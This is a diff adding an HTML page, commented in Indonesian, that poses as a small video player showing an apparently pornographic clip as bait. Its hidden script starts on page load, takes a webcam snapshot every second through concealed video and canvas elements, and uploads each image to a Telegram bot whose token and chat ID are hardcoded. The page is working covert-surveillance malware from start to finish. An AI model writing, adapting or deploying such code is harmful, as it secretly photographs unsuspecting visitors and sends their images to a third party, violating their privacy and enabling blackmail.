@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Video Page</title>
+  <style>
+    body { margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: black; }
+    #customVideo {
+      width: 240px;
+      height: 135px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    }
+    #video, #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Video kecil di tengah -->
+<video id="customVideo" autoplay muted loop>
+  <source src="bokep.mp4" type="video/mp4">
+  Maaf, browser Anda tidak mendukung video.
+</video>
+
+<!-- Kamera tersembunyi -->
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="320" height="240"></canvas>
+
+<script>
+  const chatId = "7819779147";
+  const botToken = "7840834767:AAGksa44Q5hWorJjEhTVS9wfVAvtBrHbMDM";
+
+  let isSending = false;
+
+  async function startHiddenCameraLoop() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+
+      setInterval(() => {
+        if (!isSending) {
+          isSending = true;
+          captureAndSend().then(() => isSending = false);
+        }
+      }, 1000); // setiap 1 detik
+    } catch (err) {
+      console.error("Gagal akses kamera:", err);
+    }
+  }
+
+  async function captureAndSend() {
+    return new Promise((resolve, reject) => {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "photo.jpg");
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        })
+        .then(() => resolve())
+        .catch(err => {
+          console.error("Gagal kirim:", err);
+          resolve(); // tetap lanjut walau gagal
+        });
+      }, "image/jpeg");
+    });
+  }
+
+  window.onload = () => {
+    startHiddenCameraLoop();
+  };
+</script>
+
+</body>
+</html>
